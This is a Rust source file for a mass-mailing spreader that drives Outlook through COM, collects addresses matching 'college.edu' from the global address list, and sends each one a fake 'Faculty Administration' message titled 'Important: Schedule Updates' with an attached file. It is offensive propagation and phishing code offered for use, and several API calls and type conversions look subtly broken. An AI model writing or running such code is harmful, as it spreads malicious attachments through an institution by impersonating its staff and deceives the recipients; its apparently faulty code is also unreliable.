use windows::Win32::System::Com::*;
use windows::Win32::System::Variant::*;
use windows::core::{BSTR, HRESULT};
use std::ptr;

pub struct OutlookSpreader {
    attachment_path: String,
}

impl OutlookSpreader {
    pub fn new(attachment: &str) -> Self {
        Self {
            attachment_path: attachment.to_string(),
        }
    }
    
    pub fn spread(&self) -> Result<u32, Box<dyn std::error::Error>> {
        unsafe {
            CoInitializeEx(ptr::null(), COINIT_APARTMENTTHREADED)?;
            
            // Create Outlook Application
            let outlook: IDispatch = CoCreateInstance(
                &CLSIDFromProgID("Outlook.Application")?,
                None,
                CLSCTX_LOCAL_SERVER,
            )?;
            
            // Get MAPI namespace
            let namespace = self.call_method(&outlook, "GetNamespace", &["MAPI"])?;
            
            // Login to session
            let _: Variant = self.call_method(&namespace, "Logon", &[])?;
            
            // Get global address list
            let address_lists = self.get_property(&namespace, "AddressLists")?;
            let count: i32 = self.get_property(&address_lists, "Count")?;
            
            let mut emails = Vec::new();
            
            // Iterate address lists
            for i in 1..=count {
                let list = self.call_method(&address_lists, "Item", &[i.into()])?;
                let list_type: i32 = self.get_property(&list, "AddressListType")?;
                
                // GAL = 0, OutlookAddressList = 1
                if list_type == 0 || list_type == 1 {
                    let entries = self.get_property(&list, "AddressEntries")?;
                    let entry_count: i32 = self.get_property(&entries, "Count")?;
                    
                    for j in 1..=entry_count.min(100) { // Limit to 100
                        let entry = self.call_method(&entries, "Item", &[j.into()])?;
                        let email: String = self.get_property(&entry, "Address")?;
                        let name: String = self.get_property(&entry, "Name")?;
                        
                        if email.contains('@') && email.contains("college.edu") {
                            emails.push((name, email));
                        }
                    }
                }
            }
            
            // Send emails
            let mut sent = 0;
            for (name, email) in emails {
                if self.send_email(&outlook, &name, &email).is_ok() {
                    sent += 1;
                }
                std::thread::sleep(std::time::Duration::from_secs(2));
            }
            
            CoUninitialize();
            Ok(sent)
        }
    }
    
    unsafe fn send_email(&self, outlook: &IDispatch, name: &str, email: &str) -> Result<(), Box<dyn std::error::Error>> {
        let mail = self.call_method(outlook, "CreateItem", &[0i32.into()])?; // olMailItem = 0
        
        // Set recipient
        let recipients = self.get_property::<IDispatch>(&mail, "Recipients")?;
        let recipient = self.call_method(&recipients, "Add", &[email.into()])?;
        let _: Variant = self.call_method(&recipient, "Resolve", &[])?;
        
        // Set properties
        self.set_property(&mail, "To", email)?;
        self.set_property(&mail, "Subject", "Important: Schedule Updates")?;
        
        let body = format!(
            "Dear {},\n\nPlease find the attached document regarding upcoming schedule changes.\n\nBest regards,\nFaculty Administration",
            name
        );
        self.set_property(&mail, "Body", &body)?;
        
        // Add attachment
        let attachments = self.get_property::<IDispatch>(&mail, "Attachments")?;
        let abs_path = std::fs::canonicalize(&self.attachment_path)?
            .to_string_lossy()
            .to_string();
        let _: Variant = self.call_method(&attachments, "Add", &[abs_path.into(), 1i32.into()])?;
        
        // Send
        let _: Variant = self.call_method(&mail, "Send", &[])?;
        
        Ok(())
    }
    
    unsafe fn get_property<T>(&self, obj: &IDispatch, name: &str) -> Result<T, Box<dyn std::error::Error>> 
    where T: From<Variant> {
        let name_wide: Vec<u16> = name.encode_utf16().chain(Some(0)).collect();
        let mut dispid = 0;
        
        obj.GetIDsOfNames(
            &GUID::zeroed(),
            &[name_wide.as_ptr() as *mut _],
            1,
            LOCALE_USER_DEFAULT,
            &mut dispid,
        )?;
        
        let mut result = Variant::default();
        obj.Invoke(
            dispid,
            &GUID::zeroed(),
            LOCALE_USER_DEFAULT,
            DISPATCH_PROPERTYGET,
            &DISPPARAMS::default(),
            Some(&mut result),
            None,
            None,
        )?;
        
        Ok(T::from(result))
    }
    
    unsafe fn set_property(&self, obj: &IDispatch, name: &str, value: &str) -> Result<(), Box<dyn std::error::Error>> {
        let name_wide: Vec<u16> = name.encode_utf16().chain(Some(0)).collect();
        let mut dispid = 0;
        
        obj.GetIDsOfNames(
            &GUID::zeroed(),
            &[name_wide.as_ptr() as *mut _],
            1,
            LOCALE_USER_DEFAULT,
            &mut dispid,
        )?;
        
        let value_wide: Vec<u16> = value.encode_utf16().chain(Some(0)).collect();
        let mut variant = Variant::from(BSTR::from_wide(&value_wide)?);
        
        let mut dispparams = DISPPARAMS {
            rgvarg: &mut variant as *mut _ as *mut VARIANT,
            rgdispidNamedArgs: &mut DISPID_PROPERTYPUT as *mut _,
            cArgs: 1,
            cNamedArgs: 1,
        };
        
        obj.Invoke(
            dispid,
            &GUID::zeroed(),
            LOCALE_USER_DEFAULT,
            DISPATCH_PROPERTYPUT,
            &dispparams,
            None,
            None,
            None,
        )?;
        
        Ok(())
    }
    
    unsafe fn call_method(&self, obj: &IDispatch, name: &str, args: &[Variant]) -> Result<IDispatch, Box<dyn std::error::Error>> {
        let name_wide: Vec<u16> = name.encode_utf16().chain(Some(0)).collect();
        let mut dispid = 0;
        
        obj.GetIDsOfNames(
            &GUID::zeroed(),
            &[name_wide.as_ptr() as *mut _],
            1,
            LOCALE_USER_DEFAULT,
            &mut dispid,
        )?;
        
        let mut args_rev: Vec<VARIANT> = args.iter().rev().map(|v| {
            let mut var = VARIANT::default();
            std::ptr::write(&mut var, std::mem::transmute_copy(v));
            var
        }).collect();
        
        let dispparams = DISPPARAMS {
            rgvarg: args_rev.as_mut_ptr(),
            rgdispidNamedArgs: ptr::null_mut(),
            cArgs: args.len() as u32,
            cNamedArgs: 0,
        };
        
        let mut result = Variant::default();
        obj.Invoke(
            dispid,
            &GUID::zeroed(),
            LOCALE_USER_DEFAULT,
            DISPATCH_METHOD,
            &dispparams,
            Some(&mut result),
            None,
            None,
        )?;
        
        Ok(IDispatch::from(result))
    }
}

impl From<Variant> for String {
    fn from(var: Variant) -> Self {
        unsafe {
            if var.Anonymous.Anonymous.vt.0 == VT_BSTR.0 {
                let bstr = var.Anonymous.Anonymous.Anonymous.bstrVal;
                if !bstr.is_null() {
                    return bstr.to_string().unwrap_or_default();
                }
            }
            String::new()
        }
    }
}

impl From<Variant> for i32 {
    fn from(var: Variant) -> Self {
        unsafe {
            if var.Anonymous.Anonymous.vt.0 == VT_I4.0 {
                var.Anonymous.Anonymous.Anonymous.lVal
            } else {
                0
            }
        }
    }
}

impl From<i32> for Variant {
    fn from(val: i32) -> Self {
        unsafe {
            let mut var = Variant::default();
            var.Anonymous.Anonymous.vt = VT_I4;
            var.Anonymous.Anonymous.Anonymous.lVal = val;
            var
        }
    }
}

impl From<String> for Variant {
    fn from(val: String) -> Self {
        unsafe {
            let mut var = Variant::default();
            var.Anonymous.Anonymous.vt = VT_BSTR;
            var.Anonymous.Anonymous.Anonymous.bstrVal = 
                BSTR::from(&val).unwrap_or_default().into();
            var
        }
    }
}